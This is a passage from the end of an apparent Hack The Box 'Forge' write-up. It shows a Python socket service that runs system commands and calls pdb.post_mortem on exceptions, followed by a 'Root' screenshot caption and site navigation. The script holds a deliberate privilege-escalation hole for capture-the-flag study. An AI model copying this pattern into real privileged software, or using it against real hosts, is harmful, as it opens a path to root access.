                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ps aux'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'df'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ss -lnt'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                <span class="k">break</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="n">pdb</span><span class="p">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>
<span class="k">finally</span><span class="p">:</span>
    <span class="n">quit</span><span class="p">()</span></code></pre></figure> <figure> <img src="/assets/img/forge/root.png" alt="Root" /> <figcaption> Root </figcaption> </figure> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Anubis/" > <div class="nav-arrow">Previous</div> <span class="post-title">Anubis - Hack The Box</span> </a> <a class="post-nav-item post-nav-next" href="/VulnetActive/"> <div class="nav-arrow">Next</div> <span class="post-title">Vulnet Active - Try Hack Me</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/thanks">ack.</a> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2022</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
